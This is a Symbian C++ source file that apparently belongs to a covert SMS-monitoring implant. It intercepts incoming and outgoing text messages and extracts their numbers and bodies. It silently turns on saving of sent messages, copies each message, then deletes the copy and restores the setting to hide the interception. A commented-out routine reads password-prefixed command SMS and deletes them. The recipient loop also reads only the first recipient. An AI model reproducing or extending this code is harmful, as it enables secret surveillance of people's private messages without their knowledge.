/*
 ============================================================================
 Name		: SmsMtmMonitor.cpp
 Author	  : 
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CSmsMtmMonitor implementation
 ============================================================================
 */
 
#include "SmsMtmMonitor.h"
#include "MessagingInternalCRKeys.h" 
#include "RepoUtils.h"
#include <msvids.h>
#include <smut.h>
#include <TXTrich.H>
#include <TXTETEXT.H>
#include <mtclbase.H>
#include <smutset.h>
#include <smuthdr.h> 

CSmsMtmMonitor::CSmsMtmMonitor(MSmsMtmObserver& aObs) :
	CBase(), iObserver(aObs)
	{
	// No implementation required
	}

CSmsMtmMonitor::~CSmsMtmMonitor()
	{
	delete iSmsMtm;
	delete iClientMtmReg;
	delete iMsvSession;
	__LOG_CLOSE
	}

CSmsMtmMonitor* CSmsMtmMonitor::NewLC(MSmsMtmObserver& aObs)
	{
	CSmsMtmMonitor* self = new (ELeave) CSmsMtmMonitor(aObs);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CSmsMtmMonitor* CSmsMtmMonitor::NewL(MSmsMtmObserver& aObs)
	{
	CSmsMtmMonitor* self = CSmsMtmMonitor::NewLC(aObs);
	CleanupStack::Pop(); // self;
	return self;
	}

void CSmsMtmMonitor::ConstructL()
	{
	__LOG_OPEN_ID("CommonLib", "SmsMtmMonitor.txt")
	iMsvSession = CMsvSession::OpenAsyncL(*this);
	}

HBufC* CSmsMtmMonitor::GetFromToAndBodyL(TMsvId aId, TDes& aFromTo,
		TBool readFrom)
	{
	__LOG_TXT("Switch On")
	iSmsMtm->SwitchCurrentEntryL(aId);
	__LOG_TXT("Load")
	iSmsMtm->LoadMessageL();

	HBufC* bodyBuffer = HBufC::NewLC(iSmsMtm->Body().DocumentLength());
	TPtr bodyPtr = bodyBuffer->Des();
	__LOG_TXT("Extract")
	iSmsMtm->Body().Extract(bodyPtr, 0, iSmsMtm->Body().DocumentLength());

	// This will give you actual phone number irrespective of the name of contact	
	if (readFrom)
		{
		__LOG_TXT("Read From")
		CSmsHeader& header = iSmsMtm->SmsHeader();
		TPtrC fromNumber = header.FromAddress();
		aFromTo.Copy(fromNumber);
		}
	else
		{
		__LOG_TXT("Read To")
		aFromTo.Zero();
		// This will give you actual phone number irrespective of the name of contact
		CSmsHeader& smsHeader = iSmsMtm->SmsHeader();
		const CArrayPtrFlat<CSmsNumber>& array = smsHeader.Recipients();
		for (int i = 0; i < array.Count(); i++)
			{
			CSmsNumber* smsNumber = array.At(0);
			TPtrC recipientNumber = smsNumber->Address(); // recipentNumber will contain the recipient Number
			if (aFromTo.Length() > 0)
				aFromTo.Append(_L(" "));
			aFromTo.Append(recipientNumber);
			}
		}
	__LOG_TXT("Switch Off")
	iSmsMtm->SwitchCurrentEntryL(KMsvGlobalInBoxIndexEntryId);

	__LOG_TXT("Pop")
	CleanupStack::Pop(bodyBuffer);
	return bodyBuffer;
	}

void CSmsMtmMonitor::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1,
		TAny* aArg2, TAny* aArg3)
	{
	__LOG("HandleSessionEventL:%d", aEvent);
	switch (aEvent)
		{
		case EMsvServerReady:
			{
			__LOG_TXT("*** EMsvServerReady");
			// create mtm client
			iClientMtmReg = CClientMtmRegistry::NewL(*iMsvSession);
			iSmsMtm = static_cast<CSmsClientMtm*> (iClientMtmReg->NewMtmL(
					KUidMsgTypeSMS));
			// ParseFirstSmsL();
			break;
			}

		case EMsvEntriesCreated: // 0
			{
			__LOG_TXT("*** EMsvEntriesCreated");

			// Get Folder Info
			TMsvId* folderId = STATIC_CAST( TMsvId*, aArg2 );
			if (folderId == NULL)
				return;
			__LOG("Folder : %d", *folderId);

			// Get Msg Info
			CMsvEntrySelection* entries =
					static_cast<CMsvEntrySelection*> (aArg1);
			if (entries == NULL || entries->Count() <= 0)
				return;
			TMsvId id = entries->At(0);
			__LOG("MsvId: %d", id);

			// if new message created in inbox, take its id
			if (*folderId != KMsvGlobalInBoxIndexEntryId)
				return;

			// Save id... and compare it during EMsvEntriesChanged
			iInboxMsgId = id;
			break;
			}

		case EMsvEntriesDeleted: // 2
			{
			__LOG_TXT("*** EMsvEntriesDeleted");

			TMsvId* folderId = STATIC_CAST( TMsvId*, aArg2 );
			if (folderId != NULL)
				{
				__LOG("Folder: %d", *folderId);
				}

			CMsvEntrySelection* entries =
					static_cast<CMsvEntrySelection*> (aArg1);
			if (entries == NULL || entries->Count() <= 0)
				return;
			TMsvId id = entries->At(0);
			__LOG("MsvId: %d", id);

			/*          // Non è piu' possibile rilevare l'entry... è stata cancellata
			 TMsvEntry msvEntry;
			 TMsvId serv;
			 TInt res = iMsvSession->GetEntry( id, serv, msvEntry );
			 
			 __LOG("res: %d", res);
			 
			 if (!msvEntry.Visible())
			 {
			 __LOG_TXT("Not Visible");
			 return;           	
			 }
			 
			 if (msvEntry.iMtm != KUidMsgTypeSMS)
			 {
			 __LOG("Not SMS: %X", msvEntry.iMtm.iUid);
			 return;
			 }
			 
			 if ( !msvEntry.Complete())
			 {
			 __LOG_TXT("Not Complete");
			 return;
			 }

			 __LOG("SendingState: %d", msvEntry.SendingState());
			 if (msvEntry.SendingState() == KMsvSendStateSent)
			 {
			 __LOG_TXT("Sent")
			 }
			 else
			 {
			 __LOG_TXT("Not Sent")
			 }*/
			break;
			}

		case EMsvEntriesMoved: // 3
			{
			__LOG_TXT("*** EMsvEntriesMoved");

			// Get Folder Info
			TMsvId* folderId = STATIC_CAST( TMsvId*, aArg2 );
			if (folderId == NULL)
				return;
			__LOG("Folder : %d", *folderId);

			// Get Msg Info
			CMsvEntrySelection* entries =
					static_cast<CMsvEntrySelection*> (aArg1);
			if (entries == NULL || entries->Count() <= 0)
				return;
			TMsvId id = entries->At(0);
			__LOG("MsvId: %d", id);

			if (*folderId != KMsvSentEntryId)
				{
				__LOG_TXT("Not Sent Folder");
				return;
				}/**/

			/*            TMsvEntry msvEntry;
			 TMsvId serv;
			 TInt res = iMsvSession->GetEntry( id, serv, msvEntry );            
			 __LOG("res: %d", res);
			 __LOG("Visible: %d", msvEntry.Visible());
			 __LOG("Complete: %d", msvEntry.Complete());
			 __LOG("Mtm: %X", msvEntry.iMtm.iUid);
			 __LOG("SendingState: %d", msvEntry.SendingState());
			 __LOG("New: %d", msvEntry.New());
			 __LOG("Unread: %d", msvEntry.Unread());
			 __LOG("Failed: %d", msvEntry.Failed());
			 __LOG("Operation: %d", msvEntry.Operation());
			 __LOG("Owner: %d", msvEntry.Owner());
			 __LOG("ReadOnly: %d", msvEntry.ReadOnly());
			 __LOG("MultipleRecipients: %d", msvEntry.MultipleRecipients());
			 __LOG("StandardFolder: %d", msvEntry.StandardFolder());
			 __LOG("Connected: %d", msvEntry.Connected());
			 __LOG("InPreparation: %d", msvEntry.InPreparation());
			 __LOG("OffPeak: %d", msvEntry.OffPeak());
			 __LOG("Scheduled: %d", msvEntry.Scheduled());
			 __LOG("PendingDelete: %d", msvEntry.PendingDelete());*/

			TMsvEntry msvEntry;
			TMsvId serv;
			TInt res = iMsvSession->GetEntry(id, serv, msvEntry);
			if (res != KErrNone)
				{
				__LOG("res: %d", res);
				return;
				}

			if (!msvEntry.Visible())
				{
				__LOG_TXT("Not Visible");
				return;
				}

			if (msvEntry.iMtm != KUidMsgTypeSMS)
				{
				// Se è stato disattivato il salvataggio degli sms, MTM vale 0
				__LOG("Not SMS: %X", msvEntry.iMtm.iUid);
				return;
				}

			if (!msvEntry.Complete())
				{
				__LOG_TXT("Not Complete");
				return;
				}

			RBuf number;
			number.Create(1000);
			number.CleanupClosePushL();
			RBuf body(GetFromToAndBodyL(id, number, false)); 
			body.CleanupClosePushL();
			iObserver.HandleNewMtmSmsL(number, body, EFalse);
			CleanupStack::PopAndDestroy(&body);
			CleanupStack::PopAndDestroy(&number);/**/

			// Restore the old value
			if (iOldSentItemInUseValue == 0)
				{
				iMsvSession->RemoveEntry(id);
				RepoUtils::SetL(KCRUidMuiuSettings.iUid, KMuiuSentItemsInUse, 0);
				}
			break;
			}

		case EMsvEntriesChanged: // 1 
			{
			__LOG_TXT("*** EMsvEntriesChanged");

			// Get Folder Info
			TMsvId* folderId = STATIC_CAST( TMsvId*, aArg2 );
			if (folderId == NULL)
				return;
			__LOG("Folder : %d", *folderId);

			// Get Msg Info
			CMsvEntrySelection* entries =
					static_cast<CMsvEntrySelection*> (aArg1);
			if (entries == NULL || entries->Count() <= 0)
				return;
			TMsvId id = entries->At(0);
			__LOG("MsvId: %d", id)

			if ((*folderId != KMsvGlobalInBoxIndexEntryId) && (*folderId
					!= KMsvGlobalOutBoxIndexEntryId))
				{
				__LOG_TXT("Not Inbox - Not Outbox")
				return;
				}

			TMsvEntry msvEntry;
			TMsvId serv;
			TInt res = iMsvSession->GetEntry(id, serv, msvEntry);
			if (res != KErrNone)
				{
				__LOG_TXT("Err GetEntry");
				return;
				}

			if (!msvEntry.Visible())
				{
				__LOG_TXT("Not Visible")
				return;
				}

			if (msvEntry.iMtm != KUidMsgTypeSMS)
				{
				__LOG("Not SMS: %X", msvEntry.iMtm.iUid)
				return;
				}

			if (!msvEntry.Complete())
				{
				__LOG_TXT("Not Complete")
				return;
				}

			switch (*folderId)
				{
				case KMsvGlobalOutBoxIndexEntryId:
					__LOG_TXT("Outbox")
					__LOG("SendingState: %d", msvEntry.SendingState())
					
					if (iOldSendState == msvEntry.SendingState())
						{
						__LOG_TXT("SendingState Not Changed");
						return;
						}
					switch (msvEntry.SendingState())
						{
						case KMsvSendStateSending:						// 3
							RepoUtils::GetL(KCRUidMuiuSettings.iUid,
									KMuiuSentItemsInUse, iOldSentItemInUseValue);
							if (iOldSentItemInUseValue == 0)
								{
								// Cambia lo stato per fargli salvare gli sms in uscita...
								RepoUtils::SetL(KCRUidMuiuSettings.iUid, KMuiuSentItemsInUse, 1);
								}
								break;
						case KMsvSendStateSent:
							// Verifica se avviene prima lo spostamento di questa entry nella cartella Sent, 
							// oppure se viene prima impostata una nuova entry nello stato Sending... e poi questa viene spostata in sent
							
							// A quanto pare, avviene prima lo spostamento della entry in Sent.
							break;
						case KMsvSendStateFailed:
							// Verifica se avviene prima il cambiamento di questa entry, 
							// oppure se viene prima impostata una nuova entry nello stato Sending... 
							if (iOldSentItemInUseValue == 0)
								{
								RepoUtils::SetL(KCRUidMuiuSettings.iUid, KMuiuSentItemsInUse, 0);
								}
							break;
						default:
							return;
						}
					iOldSendState = msvEntry.SendingState();
					break;
				case KMsvGlobalInBoxIndexEntryId:
					{
					if (id != iInboxMsgId)
						{
						__LOG_TXT("iInboxMsgId != id")
						return;
						}

					iInboxMsgId = KMsvNullIndexEntryId;
					__LOG_TXT("INBOX");

					RBuf number;
					number.Create(1000);
					number.CleanupClosePushL();
					RBuf body(GetFromToAndBodyL(id, number, true));
					body.CleanupClosePushL();
					__LOG_TXT("HandleIncomingSmsL")
					iObserver.HandleNewMtmSmsL(number, body, ETrue);
					CleanupStack::PopAndDestroy(&body);
					CleanupStack::PopAndDestroy(&number);
					break;
					}
				default:
					break;
				}
			break;
			}

		case EMsvGeneralError:
			{
			TInt* errorCode = static_cast<TInt*> (aArg1);
			if (errorCode == NULL)
				__LOG_TXT("*** EMsvGeneralError")
			else
				__LOG("*** EMsvGeneralError: %d", *errorCode)
			break;
			}

		case EMsvServerFailedToStart:
			{
			TInt* errorCode = static_cast<TInt*> (aArg1);
			if (errorCode == NULL)
				__LOG_TXT("*** EMsvServerFailedToStart")
			else
				__LOG("*** EMsvServerFailedToStart: %d", *errorCode)
			break;
			}
		default:
			__LOG_TXT("*** DEFAULT")
			;
			break;
		}
	}

/*
 void CGuardian::ParseFirstSmsL()
 {
 // Solo se Guardian e' stato avviato dall'autostart.
 if (iFromGui)
 return;
 // Solo se Guardian e' attivo... e solo se e' platinum.
 CMsvEntryFilter* filter = CMsvEntryFilter::NewL();
 CleanupStack::PushL(filter);
 TMsvSelectionOrdering order(0, EMsvSortByDateReverse);
 filter->SetOrder(order);
 filter->SetType(KUidMsvMessageEntry);
 filter->SetMtm(KUidMsgTypeSMS);

 CMsvEntrySelection* selection = new (ELeave) CMsvEntrySelection();
 CleanupStack::PushL(selection);

 iMsvSession->GetChildIdsL(KMsvGlobalInBoxIndexEntryId, *filter, *selection);
 __LOG("SelectionCount %d"), selection->Count());
 TInt i = 0;
 TInt qta = 2;
 while (i < selection->Count() && qta > 0)
 {
 CMsvEntry* entry = iMsvSession->GetEntryL(selection->At(i));
 CleanupStack::PushL(entry);

 TMsvEntry entryIdx = entry->Entry();

 // Verifica che si tratti di un sms
 if (entry->HasStoreL())
 {
 __LOG("Service:%d"), entryIdx.iServiceId);

 CMsvStore* store = entry->ReadStoreL();
 CleanupStack::PushL(store);

 // Legge numero di telefono e testo messaggio
 if (store->HasBodyTextL())
 {
 __LOG_TXT("HasBody"));
 CParaFormatLayer* paraLayer = CParaFormatLayer::NewL();
 CleanupStack::PushL(paraLayer);
 CCharFormatLayer* charLayer = CCharFormatLayer::NewL();
 CleanupStack::PushL(charLayer);
 CRichText* richtext = CRichText::NewL(paraLayer, charLayer);
 CleanupStack::PushL(richtext);
 TRAPD(err, store->RestoreBodyTextL(*richtext));
 if (err == KErrNone)
 {
 __LOG_TXT("BodyRestored"));
 int len = richtext->DocumentLength();
 if (len > 0)
 {
 __LOG("Len:%d"), len);
 RBuf buff;
 buff.CleanupClosePushL();
 buff.CreateL(len);
 richtext->Extract(buff, 0, len);
 buff.TrimAll();
 buff.UpperCase();

 // Check password
 TBuf<15> intercept;
 intercept = KDELIMITER;
 intercept.Append(iPassword);
 intercept.UpperCase();
 if (buff.Left(intercept.Length()).Compare(intercept)
 == 0)
 {
 buff.Delete(0, intercept.Length());

 // Get Sender
 CSmsHeader* smsHeader = CSmsHeader::NewL(
 CSmsPDU::ESmsSubmit, *richtext);
 CleanupStack::PushL(smsHeader);
 // TODO: Verifica se questo preleva anche il body richtext
 smsHeader->RestoreL(*store);
 TPtrC number = smsHeader->FromAddress();

 // Rileva Numero	
 __LOG_TXT("Number:"));
 __FLOG(number);
 this->IncomingSmsL(this->iSmsPlugin, number, buff);
 CleanupStack::PopAndDestroy(smsHeader);
 }
 CleanupStack::PopAndDestroy(&buff);
 }
 }
 qta--;

 CleanupStack::PopAndDestroy(3); // paraLayer charLayer richtext
 }
 else
 {
 __LOG_TXT("NO Body"));
 }

 CleanupStack::PopAndDestroy(store); // store
 }

 CleanupStack::PopAndDestroy(entry); // entry
 iMsvSession->RemoveEntry(entryIdx.Id());
 i++;
 }

 CleanupStack::PopAndDestroy(selection); //selection
 CleanupStack::PopAndDestroy(filter); //filter
 }/**/
